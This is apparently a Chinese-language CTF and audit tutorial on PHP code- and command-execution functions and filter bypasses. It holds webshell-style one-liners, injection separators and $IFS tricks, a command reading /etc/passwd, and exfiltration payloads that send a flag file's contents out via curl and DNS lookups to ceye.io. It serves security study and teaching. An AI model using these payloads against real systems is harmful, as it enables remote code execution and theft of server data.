## php审计函数：函数执行和命令执行及绕过

### 代码执行

代码执行概念
远程代码执行实际上是调用服务器网站代码进行执行。

常见执行方法

#### **eval**

eval():将字符串当做函数进行执行（需要传入一个完整的语句）

demo：

<?php
eval('echo "hello";');
?>
执行后就会输出一个hello

#### **assert**

assert（）：判断是否为字符串，是则当成代码执行

demo：

低版本：

<?php assert($_POST['a']);?>
php官方在php7中更改了assert函数。在php7.0.29之后的版本不支持动态调用。

7.0之后的demo

<?php
$a = 'assert';
$a(phpinfo());
?>

#### **call_user_func**

call_user_func（）：回调函数，可以使用is_callable查看是否可以进行调用

demo:

<?php
highlight_file(__FILE__);
$a = 'system';
$b = 'pwd';
call_user_func($a,$b);
call_user_func('eval','phpinfo()');
?>
其中基本可以传递任何内置的和用户自定义的函数， 除了语言结构：array、echo、empty、eval...

#### **call_user_fuc_array**

call_user_fuc_array（）：回调函数，参数为数组

demo：

<?php
highlight_file(__FILE__);
$array[0] = $_POST['a'];
call_user_func_array("assert",$array); 
?>

#### **create_function**

create_function（）：创建匿名函数

string create_function(string $args,string $code)

args是要创建的函数的参数，code是函数内的代码

demo：

<?php
highlight_file(__FILE__);
$a = create_function('$code', 'echo $code');
$b = 'hello';
$a($b);

$a = 'phpinfo();';
$b = create_function(" ", $a);
$b();
?>

#### **preg_replace**

preg_replace（）：当为/e时代码会执行，前提是不超过php7

demo:

<?php
highlight_file(__FILE__);
$a = 'phpinfo()';
$b = preg_replace("/abc/e", $a, 'abc');
？>

#### **array_map**

array_map（）：为数组的每个元素应用回调函数

demo:

<?php
highlight_file(__FILE__);
$a = $_GET['a'];
$b = $_GET['b'];
$array[0] = $b;
$c = array_map($a,$array);
?>
用法：/?a=assert&b=phpinfo();

#### **array_filter**

array_filter():依次将 array 数组中的每个值传递到 callback 函数。如果 callback 函数返回 true，则 array 数组的当前值会被包含在返回的结果数组中。数组的键名保留不变。

demo:

<?php
highlight_file(__FILE__);
$array[0] = $_GET['a'];
array_filter($array,'assert');
?>

#### **usort**

usort():使用自定义函数对数组进行排序

demo:

<?php
highlight_file(__FILE__);
usort(...$_GET);
#usort($_GET[1],'assert');
?>
...$GET是php5.6引入的新特性。即将数组展开成参数的形式

用法：

1[]=phpinfo()&1[]=123&2[]=assert

大致过程：

大概过程就是，GET变量被展开成两个参数['phpinfo', '123']和assert，传入usort函数。usort函数的第二个参数是一个回调函数assert，其调用了第一个参数中的phpinfo();

#### **uasort**

uasort():使用用户自定义的比较函数对数组的值进行排序并保持索引关联

demo:

<?php
highlight_file(__FILE__);
$e = 'assert';
$arr = array($_REQUEST['pass'],'test' );
uasort($arr, $e);
?>

#### **${}**

${}:中间的php代码将会被解析

demo：

<?php
highlight_file(__FILE__);
${phpinfo()};
?>



### 命令执行

命令执行概念
通过易受攻击的应用在主机上执行任意命令。

命令执行常见函数

#### system

system:可以执行系统命令并将其输出

demo：

<?php
highlight_file(__FILE__);
system('pwd');
system('whoami');
?>

#### exec

exec：执行命令，但无输出，可以使用output进行输出

demo：

<?php
highlight_file(__FILE__);
exec('pwd',$b);
var_dump($b);
?>

#### passthru

passthru:执行命令并输出

demo：

<?php
highlight_file(__FILE__);
passthru('ls');
?>

#### shell_exec

shell_exec:执行命令，但无回显

demo：

<?php
highlight_file(__FILE__);
var_dump(shell_exec('ls'));
?>

#### 反引号

反引号：执行shell命令，并返回输出的字符串

demo：

<?php
highlight_file(__FILE__);
$a = 'pwd';
echo `$a`;
?>

#### ob_start

ob_start:打开输出控制缓冲

demo：

<?php
highlight_file(__FILE__);
ob_start("system");
echo "whoami";
ob_end_flush();
?>

### 绕过

#### 常见分隔符

•换行符 %0a
•回车符 %0d
•连续指令 ；
•后台进程 &
•管道符 |
•逻辑 || &&

#### 绕过空格

•$IFS
•<
•${IFS}
•$IFS$9
•%09

#### 各类符号

即使用”substr string pos len“的方法进行取字符

demo：

echo "${PATH:0:1}"
echo "`expr$IFS\substr\$IFS\$(pwd)\$IFS\1\$IFS\1`"
echo `$(expr${IFS}substr${IFS}$PWD${IFS}1${IFS}1)`
expr${IFS}substr${IFS}$SESSION_MANAGER${IFS}6${IFS}1
•%0a
•%0d
•%00
•%20

#### 敏感字符绕过

**变量绕过**

a=l,b=s;$a$b

**base64编码绕过**

echo 'cat' | base64

**未定义的初始化变量**

cat$b /etc/passwd

**连接符**

cat /etc/pass’w’d

**使用通配符：**

如：

/???/?s --help
题目地址：http://moectf.cn:10012/

payload：/?cmd=eval($_GET[%27a%27]);&a=system(ls);

#### 无回显




1、使用延时函数，比如：ls|sleep 3 2、使用http,比如：ls|curl ip:port 3、使用dns

demo：

<?php
highlight_file(__FILE__);
include("where_flag.php");
echo "ping";
$ip = (string)$_GET['ping'];
$ip = str_replace(">", "0.0", $ip);
shell_exec("ping".$ip);
?>
思路1：使用cp命令将where_flag.php改名，然后下载得到flag

如：127.0.0.1;cp where_is_flag.php 1.txt

思路二：dnslog外带

因为dnslog不能带有空格，所以使用sed去空格

最后的payload：

/?ping=cat where_flag.php|sed s/[[:space:]]//.php.xxxx.ceye.io

因为ceye无法处理换行，所以我们可以使用下面的方法处理换行问题

ping=127.0.0.1 -c 1;for i in `cat where_is_flag.php`;do ping $i.xxx.ceye.io;done;
注意：只能在curl下有效

#### 长度绕过

如15位命令执行、7位命令执行、5位命令执行、4位命令执行

具体参考：https://xz.aliyun.com/t/1579

无字母数字命令执行（webshell）
1、异或

因为每个字符的本质是ascii码值，而ascii可以变成二进制，二进制进行xor后再转换，就是字母

2、取反

其实同理，将字符转换为二进制后取反

3、自增

具体可查看：

https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html https://www.php.net/manual/zh/language.operators.increment.php



参考链接：https://mp.weixin.qq.com/s/KVKvbF_gKc_9dydrK-qK8A

